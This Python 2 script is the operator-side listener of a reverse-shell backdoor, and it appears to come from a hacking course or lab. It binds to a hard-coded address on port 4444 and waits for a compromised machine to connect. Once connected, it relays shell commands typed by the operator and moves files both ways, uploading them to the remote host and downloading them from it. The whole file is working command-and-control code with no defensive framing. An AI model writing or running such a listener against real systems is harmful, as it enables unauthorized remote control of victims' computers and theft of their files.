#! /usr/bin/env python
# -*- coding: utf-8 -*-

import socket
import re
import json
import base64


class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Waiting for connections on port " + str(port))
        self.connection, address = listener.accept()
        print("[+] Connection established with " + str(address))

    def reliable_send(self, data):
        data_size = str(len(data)) + "\n"
        self.connection.send(data_size)
        self.connection.send(data)

    def reliable_receive(self):
        data = self.connection.recv(1024)
        data_size = re.search("\d*\\n", data).group(0)
        data = data.replace(data_size, "")

        while len(data) != int(data_size):
            data = data + self.connection.recv(1024)

        return data

    def get_content_of(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def start(self):
        try:
            while True:
                command = raw_input("$ ")
                command = command.split(" ")

                if command[0] == "exit":
                    break
                elif command[0] == "upload":
                    command.append(self.get_content_of(command[1]))

                data_to_send = json.dumps(command)
                self.reliable_send(data_to_send)
                result = self.reliable_receive()

                if command[0] == "download":
                    with open(command[1], "wb") as file:
                        file.write(result)
                        print("[+] Download successful.")
                else:
                    print(result)
        except KeyboardInterrupt:
            self.connection.close()


my_listener = Listener("192.168.235.155", 4444)
my_listener.start()
